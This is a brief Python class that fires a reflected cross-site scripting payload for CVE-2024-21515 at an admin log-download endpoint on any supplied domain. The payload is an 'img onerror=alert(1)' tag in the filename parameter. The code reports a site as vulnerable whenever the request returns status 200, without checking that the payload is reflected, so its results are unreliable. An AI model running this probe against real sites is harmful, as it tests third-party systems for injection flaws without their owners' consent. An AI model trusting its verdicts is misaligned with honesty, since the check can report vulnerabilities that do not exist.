import requests
import datetime

class cve_2024_21515():
	def reflected_xss(self, domain):
		payload = '/admin/index.php?route=tool/log.download&filename=error.log%3Cimg+src%3D1+onerror%3Dalert%281%29%3E'
		url = 'https://'+domain+payload
		access_endpoint = requests.post(url, allow_redirects=True)
		time = datetime.datetime.now()
		if access_endpoint.status_code == 200 : return f'[{time.hour}:{time.minute}:{time.microsecond}] CVE-2024-21515 : vulnerable'
		else : return f'[{time.hour}:{time.minute}:{time.microsecond}] CVE-2024-21515 : not vulnerable'

